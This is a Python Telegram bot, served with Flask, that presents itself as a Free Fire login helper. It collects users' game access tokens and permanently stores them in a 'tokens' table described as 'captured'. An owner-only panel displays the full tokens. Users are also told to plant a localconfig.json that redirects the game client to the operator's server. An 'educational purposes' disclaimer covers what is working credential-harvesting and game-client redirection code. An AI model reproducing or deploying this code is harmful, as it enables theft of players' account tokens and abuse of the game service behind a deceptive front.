import os
import sys
import json
import sqlite3
import threading
import time
import urllib3
from datetime import datetime
from html import escape

from flask import Flask, request, Response
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
OWNER_ID = int(os.environ.get("OWNER_ID", "5579476674"))
CHANNEL_USERNAME = os.environ.get("CHANNEL_USERNAME", "@VISWAxABHI")
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL")
PORT = int(os.environ.get("PORT", 10000))

TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

app = Flask(__name__)

MAINTENANCE_MODE = False
sessions = {}
session_lock = threading.Lock()
active_sessions = {}
active_sessions_lock = threading.Lock()

# ═══════════════════════════════════════════════════════════════
# DATABASE
# ═══════════════════════════════════════════════════════════════
def get_db():
    conn = sqlite3.connect('bot_data.db')
    conn.row_factory = sqlite3.Row
    return conn

def init_database():
    conn = get_db()
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
            chat_id INTEGER, joined_at TEXT, is_blocked INTEGER DEFAULT 0, is_banned INTEGER DEFAULT 0
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, open_id TEXT,
            access_token TEXT UNIQUE, captured_at TEXT,
            FOREIGN KEY(user_id) REFERENCES users(user_id)
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS broadcasts (
            id INTEGER PRIMARY KEY AUTOINCREMENT, message TEXT, sent_at TEXT, total_sent INTEGER
        )
    """)
    c.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
    c.execute("""
        CREATE TABLE IF NOT EXISTS sessions_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, access_token TEXT, open_id TEXT,
            started_at TEXT, stopped_at TEXT, is_active INTEGER DEFAULT 1
        )
    """)
    c.execute("INSERT INTO config (key, value) VALUES ('maintenance', 'false') ON CONFLICT(key) DO NOTHING")
    conn.commit()
    conn.close()

def db_add_user(user_id, username, first_name, chat_id):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute("INSERT INTO users (user_id, username, first_name, chat_id, joined_at) VALUES (?, ?, ?, ?, ?) ON CONFLICT(user_id) DO NOTHING",
                  (user_id, username or "N/A", first_name or "N/A", chat_id, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"DB Error add_user: {e}")

def db_get_user(user_id):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        result = c.fetchone(); conn.close()
        return result
    except Exception as e:
        print(f"DB Error get_user: {e}"); return None

def db_get_all_users():
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT * FROM users ORDER BY joined_at DESC")
        result = c.fetchall(); conn.close()
        return result
    except Exception as e:
        print(f"DB Error get_all_users: {e}"); return []

def db_get_total_users():
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users WHERE is_banned = 0")
        result = c.fetchone()[0]; conn.close()
        return result
    except Exception as e:
        print(f"DB Error total_users: {e}"); return 0

def db_save_token(user_id, open_id, access_token):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("INSERT INTO tokens (user_id, open_id, access_token, captured_at) VALUES (?, ?, ?, ?) ON CONFLICT(access_token) DO NOTHING",
                  (user_id, open_id, access_token, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit(); conn.close()
        return True
    except Exception as e:
        print(f"DB Error save_token: {e}"); return False

def db_get_all_tokens():
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT t.*, u.username, u.first_name FROM tokens t LEFT JOIN users u ON t.user_id = u.user_id ORDER BY t.id DESC")
        result = c.fetchall(); conn.close()
        return result
    except Exception as e:
        print(f"DB Error get_all_tokens: {e}"); return []

def db_get_total_tokens():
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM tokens")
        result = c.fetchone()[0]; conn.close()
        return result
    except Exception as e:
        print(f"DB Error total_tokens: {e}"); return 0

def db_ban_user(user_id, ban=True):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("UPDATE users SET is_banned = ? WHERE user_id = ?", (1 if ban else 0, user_id))
        conn.commit(); conn.close()
        return True
    except Exception as e:
        print(f"DB Error ban_user: {e}"); return False

def db_save_broadcast(message, total_sent):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("INSERT INTO broadcasts (message, sent_at, total_sent) VALUES (?, ?, ?)", (message, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), total_sent))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"DB Error save_broadcast: {e}")

def db_get_maintenance():
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT value FROM config WHERE key = 'maintenance'")
        row = c.fetchone(); conn.close()
        return row and row[0] == 'true'
    except Exception as e:
        print(f"DB Error get_maintenance: {e}"); return False

def db_set_maintenance(status):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("INSERT INTO config (key, value) VALUES ('maintenance', ?) ON CONFLICT(key) DO UPDATE SET value = ?",
                  ('true' if status else 'false', 'true' if status else 'false'))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"DB Error set_maintenance: {e}")

def db_log_session(user_id, access_token, open_id, started_at, stopped_at=None, is_active=1):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("INSERT INTO sessions_log (user_id, access_token, open_id, started_at, stopped_at, is_active) VALUES (?, ?, ?, ?, ?, ?)",
                  (user_id, access_token, open_id, started_at, stopped_at, is_active))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"DB Error log_session: {e}")

def db_stop_active_sessions(user_id):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("UPDATE sessions_log SET stopped_at = ?, is_active = 0 WHERE user_id = ? AND is_active = 1", (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), user_id))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"DB Error stop_sessions: {e}")

def db_get_active_session(user_id):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT * FROM sessions_log WHERE user_id = ? AND is_active = 1 ORDER BY id DESC LIMIT 1", (user_id,))
        result = c.fetchone(); conn.close()
        return result
    except Exception as e:
        print(f"DB Error get_active_session: {e}"); return None

def db_get_user_session_count(user_id):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM sessions_log WHERE user_id = ?", (user_id,))
        result = c.fetchone()[0]; conn.close()
        return result
    except Exception as e:
        print(f"DB Error session_count: {e}"); return 0

init_database()
MAINTENANCE_MODE = db_get_maintenance()

# ═══════════════════════════════════════════════════════════════
# TELEGRAM API HELPERS (Simple HTTP - No Async!)
# ═══════════════════════════════════════════════════════════════
def send_message(chat_id, text, parse_mode="HTML", reply_markup=None):
    """Send message via Telegram Bot API"""
    try:
        payload = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": parse_mode
        }
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        resp = requests.post(f"{TELEGRAM_API}/sendMessage", json=payload, timeout=30)
        return resp.json()
    except Exception as e:
        print(f"Send message error: {e}")
        return None

def send_document(chat_id, document_path, filename, caption="", parse_mode="HTML"):
    """Send document via Telegram Bot API"""
    try:
        with open(document_path, 'rb') as f:
            files = {'document': (filename, f)}
            data = {'chat_id': chat_id, 'caption': caption, 'parse_mode': parse_mode}
            resp = requests.post(f"{TELEGRAM_API}/sendDocument", data=data, files=files, timeout=30)
        return resp.json()
    except Exception as e:
        print(f"Send document error: {e}")
        return None

def delete_message(chat_id, message_id):
    """Delete message via Telegram Bot API"""
    try:
        requests.post(f"{TELEGRAM_API}/deleteMessage", json={"chat_id": chat_id, "message_id": message_id}, timeout=10)
    except Exception as e:
        print(f"Delete message error: {e}")

def answer_callback_query(callback_query_id):
    """Answer callback query"""
    try:
        requests.post(f"{TELEGRAM_API}/answerCallbackQuery", json={"callback_query_id": callback_query_id}, timeout=10)
    except Exception as e:
        print(f"Answer callback error: {e}")

def get_chat_member(chat_id, user_id):
    """Check if user is member of channel"""
    try:
        resp = requests.post(f"{TELEGRAM_API}/getChatMember", json={"chat_id": chat_id, "user_id": user_id}, timeout=10)
        data = resp.json()
        if data.get("ok"):
            status = data["result"].get("status", "")
            return status in ["member", "administrator", "creator"]
        return False
    except Exception as e:
        print(f"Get chat member error: {e}")
        return False

def edit_message_text(chat_id, message_id, text, parse_mode="HTML", reply_markup=None):
    """Edit message text"""
    try:
        payload = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": parse_mode
        }
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        resp = requests.post(f"{TELEGRAM_API}/editMessageText", json=payload, timeout=10)
        return resp.json()
    except Exception as e:
        print(f"Edit message error: {e}")
        return None

# ═══════════════════════════════════════════════════════════════
# KEYBOARD
# ═══════════════════════════════════════════════════════════════
def get_keyboard(user_id):
    keyboard = [
        [{"text": "Login Game"}, {"text": "Stop Session"}],
        [{"text": "Status"}]
    ]
    if user_id == OWNER_ID:
        keyboard.append([{"text": "Bot Management"}])
    keyboard.append([{"text": "About This Bot"}])
    return {"keyboard": keyboard, "resize_keyboard": True}

# ═══════════════════════════════════════════════════════════════
# BOT LOGIC
# ═══════════════════════════════════════════════════════════════
user_states = {}
states_lock = threading.Lock()

def get_welcome_text(first_name):
    return (
        f"Welcome, {first_name}!\n\n"
        f"Your session has been created successfully.\n\n"
        f"<b>About This Bot</b>\n"
        f"This bot helps you successfully login to Free Fire or Free Fire Max game account using access token.\n\n"
        f"<b>How to Use</b>\n"
        f"Click on the <b>Login Game</b> button\n"
        f"Enter your access token\n"
        f"Your proxy URL will be generated automatically\n"
        f"Follow the instructions to setup localconfig.json\n"
        f"Choose any platform and login to Free Fire or Free Fire Max\n"
        f"Once logged in, you can play unlimited matches\n\n"
        f"<b>Important Note</b>\n"
        f"As long as the session remains active in the bot, you can login to your game account. Once the session ends or stops, you will need to enter your access token again.\n\n"
        f"<b>Precaution</b>\n"
        f"Do not share your access token or proxy URL with anyone. Keep it private.\n\n"
        f"<b>Disclaimer</b>\n"
        f"This bot is provided for educational and testing purposes only. Use it responsibly.\n\n"
        f"<b>Developed by</b> @HARSHU"
    )

def get_join_text():
    return (
        "<b>Join Verification Required</b>\n\n"
        "To use this bot, you must join the following channel first:\n\n"
        "<b>Leader Updates</b>\n\n"
        "After joining, click the button below to verify:"
    )

def get_join_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "Join Channel", "url": f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}"}],
            [{"text": "Ive Joined", "callback_data": "check_joined"}]
        ]
    }

def handle_start(user_id, username, first_name, chat_id):
    """Handle /start command"""
    print(f"[START] user_id={user_id}, username={username}, chat_id={chat_id}")

    if MAINTENANCE_MODE and user_id != OWNER_ID:
        send_message(chat_id, "Bot Under Maintenance!", parse_mode="HTML")
        return

    user_data = db_get_user(user_id)
    if user_data and user_data[6] == 1:
        send_message(chat_id, "You are banned!", parse_mode="HTML")
        return

    if not get_chat_member(CHANNEL_USERNAME, user_id):
        send_message(chat_id, get_join_text(), parse_mode="HTML", reply_markup=get_join_keyboard())
        return

    db_add_user(user_id, username, first_name, chat_id)
    with session_lock:
        sessions[str(user_id)] = {"chat_id": chat_id, "tokens": []}

    send_message(chat_id, get_welcome_text(escape(first_name or "User")), parse_mode="HTML", reply_markup=get_keyboard(user_id))
    print(f"[START] Welcome sent to user {user_id}")

def handle_callback(callback_query):
    """Handle callback queries"""
    callback_id = callback_query["id"]
    user_id = callback_query["from"]["id"]
    data = callback_query["data"]
    message = callback_query.get("message", {})
    chat_id = message.get("chat", {}).get("id")
    message_id = message.get("message_id")
    username = callback_query["from"].get("username")
    first_name = callback_query["from"].get("first_name", "User")

    print(f"[CALLBACK] user_id={user_id}, data={data}")
    answer_callback_query(callback_id)

    if data == "check_joined":
        if get_chat_member(CHANNEL_USERNAME, user_id):
            db_add_user(user_id, username, first_name, chat_id)
            with session_lock:
                sessions[str(user_id)] = {"chat_id": chat_id, "tokens": []}
            delete_message(chat_id, message_id)
            send_message(chat_id, get_welcome_text(escape(first_name)), parse_mode="HTML", reply_markup=get_keyboard(user_id))
        else:
            delete_message(chat_id, message_id)
            send_message(chat_id, get_join_text(), parse_mode="HTML", reply_markup=get_join_keyboard())

    elif data.startswith("owner_"):
        handle_owner_callback(user_id, data, chat_id, message_id)

def handle_owner_callback(user_id, data, chat_id, message_id):
    """Handle owner panel callbacks"""
    global MAINTENANCE_MODE

    if user_id != OWNER_ID:
        edit_message_text(chat_id, message_id, "Unauthorized access.")
        return

    if data == "owner_users":
        users = db_get_all_users()
        if not users:
            edit_message_text(chat_id, message_id, "No users found.")
            return
        txt = f"<b>All Users ({len(users)})</b>\n\n"
        for u in users:
            s = "Banned" if u[6] == 1 else "Active"
            txt += f"{s} <code>{u[0]}</code> | {u[1] or 'N/A'} | {u[4]}\n"
        kb = {"inline_keyboard": [[{"text": "Back", "callback_data": "owner_back"}]]}
        edit_message_text(chat_id, message_id, txt, parse_mode="HTML", reply_markup=kb)

    elif data == "owner_tokens":
        tokens = db_get_all_tokens()
        if not tokens:
            edit_message_text(chat_id, message_id, "No tokens captured yet.")
            return
        txt = f"<b>All Tokens ({len(tokens)})</b>\n\n"
        for t in tokens[:10]:
            txt += f"User: <code>{t[1]}</code>\nOpen ID: <code>{t[2]}</code>\nToken: <code>{t[3]}</code>\nTime: {t[4]}\n\n"
        if len(tokens) > 10:
            txt += f"\n... and {len(tokens)-10} more"
        kb = {"inline_keyboard": [[{"text": "Back", "callback_data": "owner_back"}]]}
        edit_message_text(chat_id, message_id, txt, parse_mode="HTML", reply_markup=kb)

    elif data == "owner_bc":
        with states_lock:
            user_states[user_id] = {"state": "awaiting_broadcast", "chat_id": chat_id}
        edit_message_text(chat_id, message_id,
            "<b>Broadcast Mode</b>\n\n"
            "Send the message to broadcast to all users.\n\n"
            "Send your message below:\n\n"
            "Type <code>/cancel</code> to cancel.",
            parse_mode="HTML")

    elif data == "owner_ban":
        with states_lock:
            user_states[user_id] = {"state": "awaiting_ban", "chat_id": chat_id}
        edit_message_text(chat_id, message_id,
            "<b>Ban User</b>\n\n"
            "Enter the user ID to ban.\n\n"
            "Send user ID below:\n\n"
            "Type <code>/cancel</code> to cancel.",
            parse_mode="HTML")

    elif data == "owner_unban":
        with states_lock:
            user_states[user_id] = {"state": "awaiting_unban", "chat_id": chat_id}
        edit_message_text(chat_id, message_id,
            "<b>Unban User</b>\n\n"
            "Enter the user ID to unban.\n\n"
            "Send user ID below:\n\n"
            "Type <code>/cancel</code> to cancel.",
            parse_mode="HTML")

    elif data == "owner_maint_on":
        MAINTENANCE_MODE = True
        db_set_maintenance(True)
        edit_message_text(chat_id, message_id, "Maintenance mode enabled!", parse_mode="HTML")

    elif data == "owner_maint_off":
        MAINTENANCE_MODE = False
        db_set_maintenance(False)
        edit_message_text(chat_id, message_id, "Maintenance mode disabled!", parse_mode="HTML")

    elif data == "owner_back":
        tu = db_get_total_users()
        tt = db_get_total_tokens()
        ms = "ON" if MAINTENANCE_MODE else "OFF"
        txt = (
            f"<b>Owner Control Panel</b>\n\n"
            f"Total Users: <b>{tu}</b>\n"
            f"Total Tokens: <b>{tt}</b>\n"
            f"Maintenance: {ms}"
        )
        kb = {
            "inline_keyboard": [
                [{"text": "All Users", "callback_data": "owner_users"}],
                [{"text": "All Tokens", "callback_data": "owner_tokens"}],
                [{"text": "Broadcast", "callback_data": "owner_bc"}],
                [{"text": "Ban", "callback_data": "owner_ban"}],
                [{"text": "Unban", "callback_data": "owner_unban"}],
                [{"text": "Maintenance ON" if not MAINTENANCE_MODE else "Maintenance OFF",
                  "callback_data": "owner_maint_on" if not MAINTENANCE_MODE else "owner_maint_off"}],
                [{"text": "Back", "callback_data": "owner_back"}]
            ]
        }
        edit_message_text(chat_id, message_id, txt, parse_mode="HTML", reply_markup=kb)

def handle_text_message(user_id, username, first_name, chat_id, text):
    """Handle text messages"""
    print(f"[TEXT] user_id={user_id}, text={text[:50] if text else 'None'}")

    # Check maintenance
    if MAINTENANCE_MODE and user_id != OWNER_ID:
        send_message(chat_id, "Maintenance!", parse_mode="HTML")
        return

    # Check subscription
    if not get_chat_member(CHANNEL_USERNAME, user_id):
        send_message(chat_id, get_join_text(), parse_mode="HTML", reply_markup=get_join_keyboard())
        return

    # Check banned
    user_data = db_get_user(user_id)
    if user_data and user_data[6] == 1:
        send_message(chat_id, "Banned.")
        return

    # Handle states first
    with states_lock:
        state_data = user_states.get(user_id)

    if state_data:
        state = state_data.get("state")

        if state == "awaiting_broadcast":
            if text == "/cancel":
                with states_lock:
                    user_states.pop(user_id, None)
                send_message(chat_id, "Broadcast cancelled.", reply_markup=get_keyboard(user_id))
                return
            with states_lock:
                user_states.pop(user_id, None)
            users = db_get_all_users()
            sent = 0
            failed = 0
            progress_msg = send_message(chat_id, f"Broadcasting to {len(users)} users...")
            for u in users:
                if u[6] == 1:
                    continue
                try:
                    result = send_message(u[0], text, parse_mode="HTML")
                    if result and result.get("ok"):
                        sent += 1
                    else:
                        failed += 1
                    time.sleep(0.03)
                except Exception as e:
                    print(f"Broadcast failed for {u[0]}: {e}")
                    failed += 1
            db_save_broadcast(text, sent)
            send_message(chat_id, f"Broadcast Complete!\n\nSent: {sent}\nFailed: {failed}\nTotal: {len(users)}", parse_mode="HTML")
            send_message(chat_id, "Done!", parse_mode="HTML", reply_markup=get_keyboard(user_id))
            return

        elif state == "awaiting_ban":
            if text == "/cancel":
                with states_lock:
                    user_states.pop(user_id, None)
                send_message(chat_id, "Ban cancelled.", reply_markup=get_keyboard(user_id))
                return
            try:
                db_ban_user(int(text), True)
                send_message(chat_id, f"User {text} banned!", parse_mode="HTML")
            except Exception as e:
                send_message(chat_id, f"Invalid ID: {e}")
            with states_lock:
                user_states.pop(user_id, None)
            send_message(chat_id, "Done!", parse_mode="HTML", reply_markup=get_keyboard(user_id))
            return

        elif state == "awaiting_unban":
            if text == "/cancel":
                with states_lock:
                    user_states.pop(user_id, None)
                send_message(chat_id, "Unban cancelled.", reply_markup=get_keyboard(user_id))
                return
            try:
                db_ban_user(int(text), False)
                send_message(chat_id, f"User {text} unbanned!", parse_mode="HTML")
            except Exception as e:
                send_message(chat_id, f"Invalid ID: {e}")
            with states_lock:
                user_states.pop(user_id, None)
            send_message(chat_id, "Done!", parse_mode="HTML", reply_markup=get_keyboard(user_id))
            return

        elif state == "awaiting_token":
            if text == "/cancel":
                with states_lock:
                    user_states.pop(user_id, None)
                send_message(chat_id, "Operation cancelled.", parse_mode="HTML", reply_markup=get_keyboard(user_id))
                return
            handle_token_input(user_id, chat_id, text)
            return

    # Handle button clicks
    if text == "Login Game":
        active_session = db_get_active_session(user_id)
        with active_sessions_lock:
            has_active = str(user_id) in active_sessions

        if active_session or has_active:
            with active_sessions_lock:
                si = active_sessions.get(str(user_id), {})
            st = active_session[4] if active_session else si.get("started_at", "Unknown")
            send_message(chat_id,
                f"<b>Active Session Locked</b>\n\n"
                f"Started: <code>{st}</code>\n\n"
                f"Please press <b>Stop Session</b> first to create a new one.",
                parse_mode="HTML")
            return

        with states_lock:
            user_states[user_id] = {"state": "awaiting_token", "chat_id": chat_id}
        send_message(chat_id,
            "<b>Access Token to Login Your Game Account</b>\n\n"
            "Please send your <b>access token</b> to create a new session.\n\n"
            "Send your access token below:\n\n"
            "Type <code>/cancel</code> to cancel.",
            parse_mode="HTML")

    elif text == "Stop Session":
        with active_sessions_lock:
            has_active = str(user_id) in active_sessions
            if has_active:
                active_sessions.pop(str(user_id), None)

        db_session = db_get_active_session(user_id)
        if not has_active and not db_session:
            send_message(chat_id, "No active session.\n\nYou do not have any active session to stop.", parse_mode="HTML")
            return

        db_stop_active_sessions(user_id)
        send_message(chat_id,
            "<b>Session Stopped Successfully!</b>\n\n"
            "Your active session has been terminated.\n"
            "You can now create a new session by pressing <b>Login Game</b>.",
            parse_mode="HTML")

    elif text == "Status":
        with active_sessions_lock:
            has_active = str(user_id) in active_sessions
            si = active_sessions.get(str(user_id), {})

        db_session = db_get_active_session(user_id)
        total_sessions = db_get_user_session_count(user_id)
        total_users = db_get_total_users()

        if db_session:
            status = "Active"
            st = db_session[4]
            tok = db_session[2][:20] + "..." if db_session[2] else "N/A"
            oid = db_session[3] or "N/A"
            try:
                sd = datetime.strptime(str(st), "%Y-%m-%d %H:%M:%S")
                dur = datetime.now() - sd
                h, r = divmod(int(dur.total_seconds()), 3600)
                m, s = divmod(r, 60)
                dur_s = f"{h}h {m}m {s}s"
            except:
                dur_s = "N/A"
        elif has_active and si:
            status = "Active"
            st = si.get("started_at", "Unknown")
            tok = si.get("access_token", "N/A")[:20] + "..." or "N/A"
            oid = si.get("open_id", "N/A")
            try:
                sd = datetime.strptime(str(st), "%Y-%m-%d %H:%M:%S") if st != "Unknown" else None
                if sd:
                    dur = datetime.now() - sd
                    h, r = divmod(int(dur.total_seconds()), 3600)
                    m, s = divmod(r, 60)
                    dur_s = f"{h}h {m}m {s}s"
                else:
                    dur_s = "N/A"
            except:
                dur_s = "N/A"
        else:
            status = "Inactive"
            st = "N/A"
            tok = "N/A"
            oid = "N/A"
            dur_s = "N/A"

        send_message(chat_id,
            f"<b>Garena Login Session Status</b>\n\n"
            f"<b>Status:</b> {status}\n\n"
            f"<b>Current Session</b>\n"
            f"Start: <code>{st}</code>\n"
            f"Duration: <code>{dur_s}</code>\n"
            f"Open ID: <code>{oid}</code>\n"
            f"Token: <code>{tok}</code>\n\n"
            f"<b>Your Stats</b>\n"
            f"Sessions: <code>{total_sessions}</code>\n\n"
            f"<b>Total Bot Users</b>\n"
            f"Users: <code>{total_users}</code>",
            parse_mode="HTML")

    elif text == "About This Bot":
        send_message(chat_id,
            "<b>About This Bot</b>\n\n"
            "Purpose: Simplifies the login and session setup process.\n"
            "Authentication: Uses your access token to create a secure session.\n"
            "Proxy: Automatically generates a proxy URL for configuration.\n"
            "Configuration: Provides localconfig.json setup instructions.\n"
            "Platform Support: Supports multiple login platforms.\n"
            "Interface: Fast, simple, and user-friendly.\n"
            "Privacy: Keep your access token and proxy URL private.\n"
            "Note: Use this bot only with accounts you are authorized to access.\n\n"
            "Official Channel: @FREEFlRECODE\n"
            "Developer: @HARSHU",
            parse_mode="HTML")

    elif text == "Bot Management" and user_id == OWNER_ID:
        tu = db_get_total_users()
        tt = db_get_total_tokens()
        ms = "ON" if MAINTENANCE_MODE else "OFF"
        txt = (
            f"<b>Owner Control Panel</b>\n\n"
            f"Total Users: <b>{tu}</b>\n"
            f"Total Tokens: <b>{tt}</b>\n"
            f"Maintenance: {ms}"
        )
        kb = {
            "inline_keyboard": [
                [{"text": "All Users", "callback_data": "owner_users"}],
                [{"text": "All Tokens", "callback_data": "owner_tokens"}],
                [{"text": "Broadcast", "callback_data": "owner_bc"}],
                [{"text": "Ban", "callback_data": "owner_ban"}],
                [{"text": "Unban", "callback_data": "owner_unban"}],
                [{"text": "Maintenance ON" if not MAINTENANCE_MODE else "Maintenance OFF",
                  "callback_data": "owner_maint_on" if not MAINTENANCE_MODE else "owner_maint_off"}],
                [{"text": "Back", "callback_data": "owner_back"}]
            ]
        }
        send_message(chat_id, txt, parse_mode="HTML", reply_markup=kb)

def handle_token_input(user_id, chat_id, token):
    """Handle token input from user"""
    print(f"[TOKEN] user_id={user_id}, token={token[:20]}...")

    processing_msg = send_message(chat_id, "Processing token and generating the session...")

    try:
        from test import generate_hex_content
        hex_content, open_id = generate_hex_content(token)
    except Exception as e:
        hex_content, open_id = None, None
        print(f"test.py error: {e}")

    if not hex_content:
        with states_lock:
            user_states.pop(user_id, None)
        send_message(chat_id,
            "<b>Invalid Token</b>\n\n"
            "The access token you provided did not produce a valid response.\n"
            "Please check your access token.",
            parse_mode="HTML", reply_markup=get_keyboard(user_id))
        return

    server_url = f"{RENDER_URL}/{user_id}/" if RENDER_URL else f"http://localhost:{PORT}/{user_id}/"
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with active_sessions_lock:
        active_sessions[str(user_id)] = {
            "access_token": token,
            "open_id": open_id,
            "started_at": now
        }

    db_log_session(user_id, token, open_id, now)
    db_save_token(user_id, open_id, token)

    with states_lock:
        user_states.pop(user_id, None)

    config_data = {"serverUrl": server_url}
    config_json = json.dumps(config_data, indent=2)
    temp_config = f"lcfg_{user_id}.json"
    try:
        with open(temp_config, 'w', encoding='utf-8') as f:
            f.write(config_json)
    except Exception as e:
        print(f"Failed to create config file: {e}")

    send_message(chat_id,
        f"Successfully created access token and server URL\n\n"
        f"<code>{server_url}</code>\n\n"
        f"<b>How to Use</b>\n\n"
        f"1. Copy the server URL above\n"
        f"2. Go to this directory:\n"
        f"<code>/storage/emulated/0/Android/data/com.dts.freefiremax/files/</code>\n"
        f"3. Create a new file named <code>localconfig.json</code>\n"
        f"4. Paste the following content into the file:\n"
        f"<pre><code>{{\n  \"serverUrl\": \"{server_url}\"\n}}</code></pre>\n"
        f"5. Save the file\n"
        f"6. Open Free Fire or Free Fire Max, choose any platform and login\n"
        f"7. Once logged in, you can play unlimited matches\n\n"
        f"Note: Works with both Free Fire and Free Fire Max.\n"
        f"DM @HARSHU if you face any issues.",
        parse_mode="HTML", reply_markup=get_keyboard(user_id))

    try:
        send_document(chat_id, temp_config, "localconfig.json",
            caption=(
                "Place this file in your game directory\n\n"
                "<b>How to Use:</b>\n"
                "1. Download the file\n"
                "2. Open the folder where the file was downloaded\n"
                "3. Copy the file\n"
                "4. Go to:\n"
                "<code>/storage/emulated/0/Android/data/com.dts.freefiremax/files/</code>\n"
                "5. Paste the file into this folder\n"
                "6. Open Free Fire or Free Fire Max, choose any platform and login\n"
                "7. Once successfully logged in, you can play unlimited matches\n\n"
                "Note: This method works with both Free Fire and Free Fire Max.\n"
                "If you face any issues, DM @HARSHU"
            ),
            parse_mode="HTML")
    except Exception as e:
        print(f"Failed to send document: {e}")
        send_message(chat_id, "Failed to send localconfig.json...")

    try:
        if os.path.exists(temp_config):
            os.remove(temp_config)
    except:
        pass

# ═══════════════════════════════════════════════════════════════
# FLASK ROUTES
# ═══════════════════════════════════════════════════════════════
@app.route('/')
def home():
    return "Free Fire Login Bot Server is Running!"

@app.route('/<user_id>/', methods=['GET', 'POST'])
def proxy_handler(user_id):
    return Response("Proxy active", status=200)

@app.route('/webhook', methods=['POST'])
def webhook():
    """Receive updates from Telegram - SIMPLE & WORKING!"""
    try:
        data = request.get_json(force=True)
        print(f"[WEBHOOK] Received update_id={data.get('update_id', 'N/A')}")
        print(f"[WEBHOOK] Data keys: {list(data.keys())}")

        # Handle callback queries
        if "callback_query" in data:
            handle_callback(data["callback_query"])
            return Response('ok', status=200)

        # Handle messages
        if "message" in data:
            message = data["message"]
            chat = message.get("chat", {})
            from_user = message.get("from", {})

            chat_id = chat.get("id")
            user_id = from_user.get("id")
            username = from_user.get("username")
            first_name = from_user.get("first_name", "User")
            text = message.get("text", "")

            print(f"[WEBHOOK] Message from user_id={user_id}, text={text[:50] if text else 'None'}")

            if text.startswith("/start"):
                handle_start(user_id, username, first_name, chat_id)
            elif text.startswith("/cancel"):
                with states_lock:
                    user_states.pop(user_id, None)
                send_message(chat_id, "Cancelled.", reply_markup=get_keyboard(user_id))
            else:
                handle_text_message(user_id, username, first_name, chat_id, text)

            return Response('ok', status=200)

        return Response('ok', status=200)
    except Exception as e:
        print(f"[WEBHOOK ERROR] {e}")
        import traceback
        traceback.print_exc()
        return Response(f'error: {str(e)}', status=500)

# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════
if __name__ == '__main__':
    webhook_url = f"{RENDER_URL}/webhook" if RENDER_URL else None

    if webhook_url:
        print(f"Setting webhook to: {webhook_url}")
        try:
            # Delete old webhook
            resp = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook", timeout=10)
            print(f"Delete webhook: {resp.status_code}")

            # Set new webhook
            resp = requests.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}&drop_pending_updates=true",
                timeout=10
            )
            print(f"Set webhook: {resp.status_code} - {resp.text}")
        except Exception as e:
            print(f"Webhook setup error: {e}")

        print(f"Starting Flask server on port {PORT}...")
        app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
    else:
        print("No RENDER_EXTERNAL_URL found. Please set it for webhook mode.")
        print("Starting Flask server anyway for testing...")
        app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
